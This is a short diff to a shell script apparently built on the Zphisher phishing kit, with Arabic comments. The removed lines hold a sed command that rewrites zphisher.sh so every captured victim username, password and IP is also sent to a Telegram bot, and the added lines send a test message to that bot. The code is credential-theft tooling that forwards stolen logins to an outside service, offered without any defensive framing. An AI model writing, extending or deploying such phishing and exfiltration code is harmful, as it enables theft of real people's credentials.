@@ -918,8 +918,6 @@ send_telegram() {
     fi
 }
 
-# تعديل ملف Zphisher ليرسل للبوت
-sed -i 's/echo "$username:$password" >> auth\/usernames.dat/echo "$username:$password" >> auth\/usernames.dat \&\& send_telegram "$username" "$password" "$victim_ip"/' zphisher.sh
 
 ## Main
 kill_pid
@@ -927,4 +925,6 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
+# تجربة البوت
+send_telegram "System" "Started" "127.0.0.1"
 main_menu
